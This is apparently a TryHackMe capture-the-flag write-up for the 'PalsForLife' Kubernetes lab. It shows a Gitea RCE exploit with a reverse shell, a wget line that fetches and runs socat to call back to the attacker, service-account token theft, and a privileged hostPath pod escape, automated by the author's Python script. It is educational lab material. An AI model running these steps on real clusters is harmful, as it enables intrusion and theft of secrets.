# PalsForLife

## Introduction:

Welcome to my another writeup! In this TryHackMe [PalsForLife](https://tryhackme.com/room/palsforlife) room, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background

> Abuse a misconfigured Kubernetes cluster

Are you able to compromise this World Of Warcraft themed machine?

> Difficulty: Medium

> Difficulty: Medium

- Overall difficulty for me: Medium
    - Initial foothold: Easy
    - Privilege Escalation: Medium

# Service Enumeration

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# export RHOSTS=10.10.208.216
                                                                                                                         
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# rustscan --range=1-65535 -a $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt         
[...]
Open 10.10.208.216:22
Open 10.10.208.216:6443
Open 10.10.208.216:10250
Open 10.10.208.216:30180
Open 10.10.208.216:31111
Open 10.10.208.216:31112
```

**Nmap:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# nmap -p 22,6443,10250,30180,31111,31112 -sC -sV -oN rustscan/nmap.txt $RHOSTS
[...]
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c9:f7:dd:3d:79:bb:f8:44:0f:bd:87:bd:8b:af:e1:5a (RSA)
|   256 4c:48:9d:c6:b4:e2:17:99:76:48:20:fe:96:d2:c8:eb (ECDSA)
|_  256 d8:e2:f7:ac:4d:cd:68:66:d7:a9:64:1c:42:4a:8e:30 (ED25519)
6443/tcp  open  ssl/sun-sr-https?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sat, 03 Sep 2022 05:38:53 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sat, 03 Sep 2022 05:38:18 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sat, 03 Sep 2022 05:38:19 GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
| ssl-cert: Subject: commonName=k3s/organizationName=k3s
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc.cluster.local, DNS:localhost, IP Address:10.10.208.216, IP Address:10.43.0.1, IP Address:127.0.0.1, IP Address:172.30.18.136, IP Address:192.168.1.244
| Issuer: commonName=k3s-server-ca@1622498168
| Public Key type: ec
| Public Key bits: 256
| Signature Algorithm: ecdsa-with-SHA256
| Not valid before: 2021-05-31T21:56:08
| Not valid after:  2023-09-03T05:28:16
| MD5:   44a4 96ad a42b b5a5 129b 6841 f1c3 b78e
|_SHA-1: 5795 58d0 28c4 08e7 f693 52ac 7712 9396 9409 6471
10250/tcp open  ssl/http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title.
| ssl-cert: Subject: commonName=palsforlife
| Subject Alternative Name: DNS:palsforlife, DNS:localhost, IP Address:127.0.0.1, IP Address:10.10.208.216
| Issuer: commonName=k3s-server-ca@1622498168
| Public Key type: ec
| Public Key bits: 256
| Signature Algorithm: ecdsa-with-SHA256
| Not valid before: 2021-05-31T21:56:08
| Not valid after:  2023-09-03T05:28:30
| MD5:   e94f fe4c fc5c c68d 106f cd3c 9230 9dbe
|_SHA-1: 7299 1005 a96f 7dd5 e2f9 18f4 ca74 935d b5da bdb4
30180/tcp open  http              nginx 1.21.0
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: 403 Forbidden
|_http-server-header: nginx/1.21.0
31111/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=3ad041db5d4f417b; Path=/; HttpOnly
|     Set-Cookie: _csrf=JP28vRh9-nmG451THAjU2EXjgZM6MTY2MjE4MzQ5MTM5NjA0NjYxMQ%3D%3D; Path=/; Expires=Sun, 04 Sep 2022 05:38:11 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 03 Sep 2022 05:38:11 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Gitea: Git with a cup of tea</title>
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go" />
|     <meta name="keywords" content="go,git,self-hosted,gitea
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=8c14aad789435b28; Path=/; HttpOnly
|     Set-Cookie: _csrf=BOq9R76l2g_vSI7-njxviCyyJOs6MTY2MjE4MzQ5MTg0ODI2NzgwNQ%3D%3D; Path=/; Expires=Sun, 04 Sep 2022 05:38:11 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 03 Sep 2022 05:38:11 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea</title>
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go" />
|_    <meta name="keywords" content="
31112/tcp open  ssh               OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 2b:c6:63:84:93:b8:04:ce:1c:f5:ce:c7:0e:ca:eb:28 (RSA)
|   256 93:6b:41:5f:89:14:97:0c:6b:53:ab:ba:af:71:f1:40 (ECDSA)
|_  256 e8:c4:94:7b:72:d7:4c:1c:bd:51:4a:84:81:4b:68:c9 (ED25519)
```

According to `rustscan` and `nmap` result, we have 6 ports are opened:

Ports Open        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu
6443              | Kubernetes API port
10250             | HTTPS
30180             | nginx 1.21.0
31111             | HTTP
31112             | OpenSSH 7.5

## HTTPS on Port 6443

**https://10.10.208.216:6443/:**
```json
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {
    
  },
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}
```

In the certificate, we can see there are some subdomains in "Subject Alt Names":

```
DNS Name kubernetes
DNS Name kubernetes.default
DNS Name kubernetes.default.svc.cluster.local
```

## HTTP on Port 31111

**http://10.10.208.216:31111/:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PalsForLife/images/a1.png)

It's the `Gitea`.

**Gitea version:**
```
Gitea Version: 38d8b8c
```

We'll leave that for now, as we don't have any credentials.

## HTTP on Port 30180

**http://10.10.208.216:30180/:**
```
403 Forbidden
nginx/1.21.0
```

In `gobuster`, we can find 1 directory:

**Gobuster:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# gobuster dir -u http://$RHOSTS:30180/ -w /usr/share/wordlists/dirb/big.txt -t 100
[...]
/team                 (Status: 301) [Size: 169] [--> http://10.10.208.216/team/]
```

Let's take a look at that!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PalsForLife/images/a2.png)

**View-Source:**
```html
<!-- I shouldn't forget this -->
      <div id="uninteresting_file.pdf" style="visibility: hidden; display: none;">JVBERi0xLjcKJb/3ov4KMSAwIG9iago8PCAvRGVzdHMgMyAwIFIgL0V4dGVuc2lvbnMgPDwgL0FE
QkUgPDwgL0Jhc2VWZXJzaW9uIC8xLjcgL0V4dGVuc2lvbkxldmVsIDggPj4gPj4gL1BhZ2VzIDQg
MCBSIC9UeXBlIC9DYXRhbG9nID4+CmVuZG9iagoyIDAgb2JqCjw8IC9DcmVhdGlvbkRhdGUgPDEw
[...]
</div>
```

An interesting **base64** string... Let's decode that!

```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# nano uninteresting_file.b64     
                                                                                                                         
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# base64 -d uninteresting_file.b64 > uninteresting_file.pdf
```

Let's open that PDF file!

```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# file uninteresting_file.pdf                         
uninteresting_file.pdf: PDF document, version 1.7, 1 pages
                                                                                                                         
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# evince uninteresting_file.pdf
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PalsForLife/images/a3.png)

It needs a password...

We can use `pdf2john` and `john` to crack it:

```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# pdf2john uninteresting_file.pdf > uninteresting_file.hash

┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt uninteresting_file.hash 
[...]
{Redacted}      (uninteresting_file.pdf)
```

Found it! We now can unlock the PDF:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PalsForLife/images/a4.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PalsForLife/images/a5.png)

This looks a password. Let's take a note of that.

## HTTPS on Port 10250

**https://10.10.208.216:10250/:**
```
404 page not found
```

**Gobuster:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# gobuster dir -u https://$RHOSTS:10250/ -w /usr/share/wordlists/dirb/big.txt -t 100 -k
[...]
/attach               (Status: 401) [Size: 12]
/exec                 (Status: 401) [Size: 12]
/logs                 (Status: 301) [Size: 41] [--> /logs/]
/metrics              (Status: 401) [Size: 12]             
/pods                 (Status: 401) [Size: 12]             
/run                  (Status: 401) [Size: 12]             
/stats                (Status: 301) [Size: 42] [--> /stats/]
```

All of them are "Unauthorized".

Take a step back. Since we found several kubernete services, we can try to exploit them.

First, we need to identifiy what those ports are:

Ports             | Description
------------------|------------------------
6443              | Kubernetes API port
10250             | HTTPS API which allows full mode access
30000-32767       | Proxy to the services

## Kube-apiserver on Port 6443

This is the API Kubernetes service the administrators talks with usually using the tool `kubectl`.

**Common ports:** `6443` and `443`, but also `8443` in minikube and `8080` as insecure.

```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# curl -k https://$RHOSTS:6443/api/v1    
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {
    
  },
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}
```

We can see that the response is `Unauthorized`, which means the kube-apiserver API endpoints are **forbidden to anonymous** access.

## Kubelet API on Port 10250

This service **run in every node of the cluster**. It's the service that will **control** the pods inside the node. It talks with the **kube-apiserver**.

```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# curl -k https://$RHOSTS:10250/pods 
Unauthorized
```

If the response is `Unauthorized` then it requires authentication, which means we can't exploit it.

Hmm... Looks like we couldn't gain initial foothold in kubernetes. Let's go back to where we found a password.

In HTTP on port 30180, we found a **base64** string, decoded it into a PDF file, cracked it's protected password and found a password.

Maybe we can login to `Gitea` on port 31111?

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PalsForLife/images/a6.png)

We can also see that there is a user called `leeroy`. We can try to login as this user with the password that we've found.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PalsForLife/images/a7.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PalsForLife/images/a8.png)

We're in!

By enumerating his repository, inside the "Webhooks", there is a "Secret":

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PalsForLife/images/a9.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PalsForLife/images/a10.png)

Which is a flag!

# Initial Foothold

Since we have access to Gitea with administrator privilege, we can gain initial foothold.

To do so, I'll first searching public exploits:

**Searchsploit:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# searchsploit gitea   
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Gitea 1.12.5 - Remote Code Execution (Authenticated)                              | multiple/webapps/49571.py
Gitea 1.4.0 - Remote Code Execution                                               | multiple/webapps/44996.py
Gitea 1.7.5 - Remote Code Execution                                               | multiple/webapps/49383.py
---------------------------------------------------------------------------------- ---------------------------------
```

The first one looks good for us. Let's mirror that exploit and **look carefully what it's doing**:

```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# searchsploit -m 49571
```

**49571.py:**

Overall, what this exploit does is:

- Login into an user
- Create a repository
- Delete a repository
- Setting up webhooks
- Trigger the reverse shell via making changes in a repository, and `git remote add origin` with a reverse shell

Let's run this exploit!

```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# python3 49571.py -t http://$RHOSTS:31111 -u "leeroy" -p "{Redacted}" -I 10.18.61.134 -P 443
    _____ _ _______
   / ____(_)__   __|             CVE-2020-14144
  | |  __ _   | | ___  __ _
  | | |_ | |  | |/ _ \/ _` |     Authenticated Remote Code Execution
  | |__| | |  | |  __/ (_| |
   \_____|_|  |_|\___|\__,_|     GiTea versions >= 1.1.0 to <= 1.12.5
     
[+] Starting exploit ...
hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint: 
hint: 	git config --global init.defaultBranch <name>
hint: 
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint: 
hint: 	git branch -m <name>
Initialized empty Git repository in /tmp/tmp.tUXZySn4qn/.git/
[master (root-commit) 1c7c65b] Initial commit
 1 file changed, 1 insertion(+)
 create mode 100644 README.md
Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Writing objects: 100% (3/3), 249 bytes | 249.00 KiB/s, done.
[+] Exploit completed !
```

```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# rlwrap -cAr nc -lvnp 443               
listening on [any] 443 ...
connect to [10.18.61.134] from (UNKNOWN) [10.10.208.216] 42148
bash: cannot set terminal process group (14): Not a tty
bash: no job control in this shell
bash-4.4$ whoami;hostname;id;ip a
git
gitea-0
uid=1000(git) gid=1000(git) groups=1000(git),1000(git)
[...]
3: eth0@if8: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 8951 qdisc noqueue state UP 
    link/ether c2:83:24:15:49:73 brd ff:ff:ff:ff:ff:ff
    inet 10.42.0.14/24 brd 10.42.0.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::c083:24ff:fe15:4973/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `git` now!

**Stable shell via `socat`:**
```
┌──(root💀siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80

bash-4.4$ wget http://10.18.61.134/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.18.61.134:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2022/09/03 03:14:19 socat[42308] N opening character device "/dev/pts/2" for reading and writing
2022/09/03 03:14:19 socat[42308] N listening on AF=2 0.0.0.0:4444
                                                                 2022/09/03 03:14:23 socat[42308] N accepting connection from AF=2 10.10.208.216:33056 on AF=2 10.18.61.134:4444
                                                      2022/09/03 03:14:23 socat[42308] N starting data transfer loop with FDs [5,5] and [7,7]
                    bash-4.4$ 
bash-4.4$ stty rows 22 columns 121
bash-4.4$ export TERM=xterm-256color
bash-4.4$ ^C
```

**flag2.txt:**
```
bash-4.4$ find / -type f -name "flag*.txt" 2>/dev/null
/root/..2021_05_31_22_01_32.228018415/flag2.txt

bash-4.4$ cat "/root/..2021_05_31_22_01_32.228018415/flag2.txt"
flag{Redacted}
```

# Privilege Escalation

## git to root

Since we inside the machine, we can now abuse kubernetes.

**Service Account Tokens:**

`ServiceAccount` is an object managed by Kubernetes and used to provide an identity for processes that run in a pod.

Every service account has a secret related to it and this secret contains a bearer token. This is a JSON Web Token (JWT), a method for representing claims securely between two parties.

Usually one of the directories:

- /run/secrets/kubernetes.io/serviceaccount
- /var/run/secrets/kubernetes.io/serviceaccount
- /secrets/kubernetes.io/serviceaccount

```
bash-4.4$ ls -lah /run/secrets/kubernetes.io/serviceaccount/
total 4
drwxrwxrwt    3 root     root         140 Sep  3 06:50 .
drwxr-xr-x    3 root     root        4.0K Sep  3 06:51 ..
drwxr-xr-x    2 root     root         100 Sep  3 06:50 ..2022_09_03_06_50_46.766033269
lrwxrwxrwx    1 root     root          31 Sep  3 06:50 ..data -> ..2022_09_03_06_50_46.766033269
lrwxrwxrwx    1 root     root          13 Sep  3 06:50 ca.crt -> ..data/ca.crt
lrwxrwxrwx    1 root     root          16 Sep  3 06:50 namespace -> ..data/namespace
lrwxrwxrwx    1 root     root          12 Sep  3 06:50 token -> ..data/token

bash-4.4$ ls -lah /var/run/secrets/kubernetes.io/serviceaccount
total 4
drwxrwxrwt    3 root     root         140 Sep  3 06:50 .
drwxr-xr-x    3 root     root        4.0K Sep  3 06:51 ..
drwxr-xr-x    2 root     root         100 Sep  3 06:50 ..2022_09_03_06_50_46.766033269
lrwxrwxrwx    1 root     root          31 Sep  3 06:50 ..data -> ..2022_09_03_06_50_46.766033269
lrwxrwxrwx    1 root     root          13 Sep  3 06:50 ca.crt -> ..data/ca.crt
lrwxrwxrwx    1 root     root          16 Sep  3 06:50 namespace -> ..data/namespace
lrwxrwxrwx    1 root     root          12 Sep  3 06:50 token -> ..data/token
```

contain the files:

- `ca.crt`: It's the ca certificate to check kubernetes communications
- `namespace`: It indicates the current namespace
- `token`: It contains the service token of the current pod

```
bash-4.4$ cat token
{Redacted_Token}
```

Armed with this token, we can use `kutectl` to interact with the machine's kubernetes.

```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# kubectl --server https://$RHOSTS:6443 --token {Redacted_Token} --insecure-skip-tls-verify auth can-i --list
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
            [*]                 []               [*]
```

We can now enumerate kubernetes!

**Get Supported Resources:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# kubectl --server https://$RHOSTS:6443 --token {Redacted_Token} --insecure-skip-tls-verify api-resources --namespaced=true 
NAME                        SHORTNAMES   APIVERSION                     NAMESPACED   KIND
[...]
secrets                                  v1                             true         Secret
[...]
```

The `secrets` resource looks interesting.

```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# kubectl --server https://$RHOSTS:6443 --token {Redacted_Token} --insecure-skip-tls-verify get secrets --all-namespaces  
NAMESPACE         NAME                                                 TYPE                                  DATA   AGE
[...]
kube-system       flag3                                                Opaque                                1      459d
```

Found `flag3`! Let's extract it!

**flag3.txt:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# kubectl --server https://$RHOSTS:6443 --token {Redacted_Token} --insecure-skip-tls-verify get secrets flag3 -n kube-system -o yaml
apiVersion: v1
data:
  flag3.txt: {Redacted}
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Secret","metadata":{"annotations":{},"name":"flag3","namespace":"kube-system"},"stringData":{"flag3.txt":"flag{Redacted}"},"type":"Opaque"}
```

Then, we can create a `pod.yaml` file and mounting the root directory:

- Create a `pod.yaml` file:

**pod.yaml:**
```yaml       
apiVersion: v1
kind: Pod
metadata:
  name: pod
  labels:
    app: pod
spec:
  containers:
  - name: pod
    image: gitea/gitea:1.5.1
    imagePullPolicy: IfNotPresent
    volumeMounts:
    - name: hostvolume
      mountPath: /pod
    ports:
    - containerPort: 80
    securityContext:
     privileged: true
  volumes:
  - name: hostvolume
    hostPath:
      path: /
```

- Create a new pod:

```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# kubectl --server https://$RHOSTS:6443 --token {Redacted_Token} --insecure-skip-tls-verify create -f pod.yaml                      
pod/pod created
```

- Verify the new pod is created:

```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# kubectl --server https://$RHOSTS:6443 --token {Redacted_Token} --insecure-skip-tls-verify get pods                                  
NAME                     READY   STATUS    RESTARTS   AGE
[...]
pod                      1/1     Running   0          12s
```

- Spawn a root shell:

```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# kubectl --server https://$RHOSTS:6443 --token {Redacted_Token} --insecure-skip-tls-verify exec --tty --stdin pod '/bin/bash'
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
bash-4.4# whoami;hostname;id;ip a
root
pod
uid=0(root) gid=0(root) groups=1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
[...]
3: eth0@if9: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 8951 qdisc noqueue state UP 
    link/ether 0a:90:b4:68:b7:62 brd ff:ff:ff:ff:ff:ff
    inet 10.42.0.15/24 brd 10.42.0.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::890:b4ff:fe68:b762/64 scope link 
       valid_lft forever preferred_lft forever
```

And I'm root! :D

> Note: I also made a [simple python script](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PalsForLife/enumk8s.py) to automate this exploit process. :D

```py
#!/usr/bin/env python3

import argparse
import os
from colorama import Fore, init
import time

init(autoreset=True)

parser = argparse.ArgumentParser(description="This is an semiautomated python script that enumerating kubernetes cluster in 'PalsForLife' room in TryHackMe.")
parser.add_argument("-t", "--token", help="Service account token")
parser.add_argument("-u", "--url", help="The target machine's URL. E.g. https://10.10.44.205")
parser.add_argument("-p", "--port", help="The port of the URL")
args = parser.parse_args()

def get_auth():
    command = f"kubectl --server {args.url}:{args.port} --token {args.token} --insecure-skip-tls-verify auth can-i --list"
    os.system(command)

def get_res():
    command = f"kubectl --server {args.url}:{args.port} --token {args.token} --insecure-skip-tls-verify api-resources --namespaced=true "
    os.system(command)

def get_name(resource):
    command = f"kubectl --server {args.url}:{args.port} --token {args.token} --insecure-skip-tls-verify get {resource} --all-namespaces"
    os.system(command)

def ext_name(resource, name, namespace):
    command = f"kubectl --server {args.url}:{args.port} --token {args.token} --insecure-skip-tls-verify get {resource} {name} -n {namespace} -o yaml"
    os.system(command)

def createpod():
    print(Fore.CYAN + "Creating pod.yaml...")
    os.system("""echo 'apiVersion: v1
kind: Pod
metadata:
  name: pod
  labels:
    app: pod
spec:
  containers:
  - name: pod
    image: gitea/gitea:1.5.1
    imagePullPolicy: IfNotPresent
    volumeMounts:
    - name: hostvolume
      mountPath: /pod
    ports:
    - containerPort: 80
    securityContext:
     privileged: true
  volumes:
  - name: hostvolume
    hostPath:
      path: /' > pod.yaml
        """)
    command = f"kubectl --server {args.url}:{args.port} --token {args.token} --insecure-skip-tls-verify create -f pod.yaml"
    os.system(command)

def spawnshell():
    print(Fore.CYAN + "-" * 10 + "Spawning a Root Shell :D" + "-" * 10)
    command = f"kubectl --server {args.url}:{args.port} --token {args.token} --insecure-skip-tls-verify exec --tty --stdin pod '/bin/bash'"
    os.system(command)

print(Fore.CYAN + "-" * 10 + "Part 1: Getting Current Privileges" + "-" * 10)
get_auth()

print(Fore.CYAN + "-" * 10 + "Part 2: Getting Supported Resources" + "-" * 10)
get_res()

print(Fore.CYAN + "-" * 10 + "Part 3: Getting Resource" + "-" * 10)
res = input("Which resources you want? E.g. secrets\n")
get_name(res)

print(Fore.CYAN + "-" * 10 + "Part 4: Extracting Name" + "-" * 10)
name = input("Which name you want? E.g. flag3\n")
namespace = input("Which namespace you want? E.g. kube-system\n")
ext_name(res, name, namespace)

print(Fore.CYAN + "-" * 10 + "Part 5: Spawning a Root Shell(Optional)" + "-" * 10)
revshell = input("Do you need to spawn a root shell? Y/N\n")

if revshell == "Y":
    createpod()
    time.sleep(2)
    spawnshell()
else:
    print(Fore.CYAN + "Bye!")
    exit()
```

**Output:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
└─# python3 enumk8s.py -t "{Redacted_Token}" -u https://$RHOSTS -p 6443
----------Part 1: Getting Current Privileges----------
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
            [*]                 []               [*]
----------Part 2: Getting Supported Resources----------
NAME                        SHORTNAMES   APIVERSION                     NAMESPACED   KIND
[...]
secrets                                  v1                             true         Secret
[...]
----------Part 3: Getting Resource----------
Which resources you want? E.g. secrets
secrets
NAMESPACE         NAME                                                 TYPE                                  DATA   AGE
[...]
kube-system       flag3                                                Opaque                                1      459d
[...]
----------Part 4: Extracting Name----------
Which name you want? E.g. flag3
flag3
Which namespace you want? E.g. kube-system
kube-system
apiVersion: v1
data:
  flag3.txt: {Redacted}
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Secret","metadata":{"annotations":{},"name":"flag3","namespace":"kube-system"},"stringData":{"flag3.txt":"flag{Redacted}"},"type":"Opaque"}
[...]
type: Opaque
----------Part 5: Spawning a Root Shell(Optional)----------
Do you need to spawn a root shell? Y/N
Y
Creating pod.yaml...
pod/pod created
----------Spawning a Root Shell :D----------
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
bash-4.4# whoami;hostname;id;ip a
root
pod
uid=0(root) gid=0(root) groups=1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
[...]
3: eth0@if9: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 8951 qdisc noqueue state UP 
    link/ether e6:cb:c8:59:b9:7e brd ff:ff:ff:ff:ff:ff
    inet 10.42.0.15/24 brd 10.42.0.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::e4cb:c8ff:fe59:b97e/64 scope link 
       valid_lft forever preferred_lft forever
```

# Rooted

**root.txt:**
```
bash-4.4# cat /pod/root/root.txt
flag{Redacted}
```

# Conclusion

What we've learned:

1. Cracking Protected Password in PDF
2. Gitea Authenticated Remote Code Execution
3. Enumerating Kubernetes
4. Privilege Escalation via Exploiting Kubernetes